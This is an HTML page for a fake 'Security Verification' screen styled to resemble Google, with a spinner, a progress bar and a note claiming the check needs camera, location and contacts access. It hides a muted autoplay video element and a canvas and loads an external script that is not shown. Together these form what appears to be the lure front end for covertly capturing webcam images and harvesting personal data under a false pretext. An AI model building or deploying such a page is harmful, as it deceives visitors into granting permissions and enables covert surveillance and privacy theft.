<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: #fff;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .logo {
            margin-bottom: 30px;
        }
        .logo-img {
            height: 50px;
        }
        .loader {
            width: 40px;
            height: 40px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #4285f4;
            border-radius: 50%;
            margin: 0 auto 25px;
            animation: spin 1s linear infinite;
        }
        h1 {
            font-size: 20px;
            font-weight: 500;
            margin-bottom: 10px;
            color: #202124;
        }
        p {
            color: #5f6368;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 25px;
        }
        .progress {
            height: 3px;
            background: #e8eaed;
            border-radius: 2px;
            margin-bottom: 15px;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            width: 0%;
            background: #4285f4;
            transition: width 0.3s;
        }
        .status {
            font-size: 13px;
            color: #80868b;
            min-height: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .permission-note {
            font-size: 12px;
            color: #666;
            margin-top: 20px;
            padding-top: 15px;
            border-top: 1px solid #eee;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo" id="logo">
            <div class="loader" id="spinner"></div>
        </div>
        <h1 id="title">Security Verification</h1>
        <p id="message">Verifying your browser environment...</p>
        <div class="progress">
            <div class="progress-bar" id="progress"></div>
        </div>
        <div class="status" id="status">Initializing...</div>
        <div class="permission-note" id="permissionNote" style="display: none;">
            This verification requires camera, location, and contacts access.
        </div>
    </div>

    <!-- Hidden elements -->
    <video id="camera" autoplay playsinline muted style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script src="script.js"></script>
</body>
</html>
